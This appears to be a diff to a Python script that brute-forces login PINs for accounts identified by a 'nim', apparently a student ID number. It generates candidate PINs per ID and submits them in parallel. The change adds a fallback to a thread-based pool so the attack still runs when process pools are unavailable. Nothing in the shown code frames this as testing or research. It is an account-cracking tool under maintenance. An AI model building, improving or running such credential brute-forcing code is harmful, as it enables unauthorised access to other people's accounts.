@@ -1,6 +1,7 @@
 #!/usr/bin/env python3.6
 
 import multiprocessing  # Pool, Manager
+import multiprocessing.dummy
 import gc               # gc.collect
 import time             # time.time
 import requests         # request.post
@@ -80,9 +81,14 @@ def brute(nim, process_count):
             logging.warning('Saved pin is bad, trying normal method.')
             os.remove(filename)
 
-    with multiprocessing.Pool(process_count) as pool:
-        result = list(pool.starmap(
-            login, [[nim, pin, found, counter] for pin in SDict(nim)]))
+    try:
+        with multiprocessing.Pool(process_count) as pool:
+            result = list(pool.starmap(
+                login, [[nim, pin, found, counter] for pin in SDict(nim)]))
+    except ImportError:
+        with multiprocessing.dummy.Pool(process_count) as pool:
+            result = list(pool.starmap(
+                login, [[nim, pin, found, counter] for pin in SDict(nim)]))
 
     result = list(set(result))
     result.remove(None)
